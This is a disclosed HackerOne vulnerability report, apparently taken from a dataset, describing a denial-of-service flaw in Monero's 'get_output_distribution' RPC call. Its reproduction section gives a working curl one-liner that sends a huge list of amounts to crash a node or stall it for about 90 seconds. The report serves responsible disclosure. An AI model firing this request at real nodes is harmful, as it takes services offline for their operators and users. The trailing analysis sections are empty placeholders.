---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '1379707'
original_report_id: '1379707'
title: RPC call crashes node
weakness: Uncontrolled Resource Consumption
team_handle: monero
created_at: '2021-10-24T15:19:11.375Z'
disclosed_at: '2022-08-20T03:41:29.301Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 28
tags:
- hackerone
- uncontrolled-resource-consumption
---

# RPC call crashes node

## Metadata

- HackerOne Report ID: 1379707
- Weakness: Uncontrolled Resource Consumption
- Program: monero
- Disclosed At: 2022-08-20T03:41:29.301Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

## Summary:
Passing a large list of amounts to the `get_output_distribution` call crashes a remote node, after maybe 90 seconds of keeping it busy.

## Releases Affected:

  * Probably all

## Steps To Reproduce:
```
values=`echo $(seq 0 500 900000)|sed -e 's/ /,/g'` ; curl http://127.0.0.1:38081/json_rpc -d '{"jsonrpc":"2.0","id":"0","method":"get_output_distribution","params":{"amounts": ['$values'], "from_height": 100, "cumulative": false}' -H 'Content-Type: application/json'
```
Reduce the 900000 number a bit and instead of crashing the daemon, it'll do a denial of service, like 90 seconds per call, making it hard for anyone else to use that call.


## Supporting Material/References:

  * Unnecessary. The attack is  straightforward and compelling.

## Housekeeping

Payment address: ████

## Impact

An attacker can crash any remote node that exposes `get_output_distribution` or tie up availability of that function call. I think that's serious.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
